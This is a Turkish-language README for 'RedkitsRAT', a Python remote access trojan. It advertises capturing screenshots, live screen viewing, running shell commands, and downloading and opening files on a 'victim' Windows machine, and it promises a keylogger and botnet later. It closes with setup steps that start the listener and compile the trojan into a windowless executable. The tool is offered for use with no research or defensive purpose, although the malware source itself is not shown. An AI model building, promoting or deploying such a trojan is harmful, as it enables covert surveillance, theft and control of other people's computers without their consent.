# 🐀 RedkitsRAT

Bu RAT programının bedava sürümünü güvenle kullanabilirsiniz. Geliştirilmeye devam eden modülleriyle temel uzak yönetim ihtiyaçlarını karşılar.

---

## 🚀 Özellikler

*   📸 Ekran görüntüsü (SS) alma
*   📺 Canlı ekran paylaşımı
*   🐚 Temel shell (komut satırı) komutlarını çalıştırma
*   📥 Dosya indirme & 📂 Dosya açma
*   🌐 Hedefte istenen web sitesini açma
*   ⏳ *Keylogger (Yakında)*
*   ⏳ *Botnet (Yakında)*

---

## 💻 Desteklenen Platformlar

| Bileşen | Desteklenen İşletim Sistemleri |
| :--- | :--- |
| **Trojan (Kurban)** | Windows 10, Windows 11 |
| **Listener (Dinleyici)** | Linux, Windows, macOS |

---

## 🛠️ Gereksinimler

*   **Python:** En güncel Python 3 sürümü (`Python 3.10+` önerilir)
*   **Bağımlılıklar:** `requirements.txt` dosyasındaki kütüphaneler

---

## 📦 Kurulum ve Çalıştırma

Projeyi bilgisayarınıza indirdikten sonra terminal veya komut satırını açıp sırasıyla aşağıdaki komutları çalıştırın:

```bash
# 1. Gerekli kütüphaneleri yükleyin
pip install -r requirements.txt

# 2. Dinleyiciyi (Listener) başlatın
python listener.py

# 3. Payloadı oluşturun
pyinstaller --onefile --noconsole trojan.py
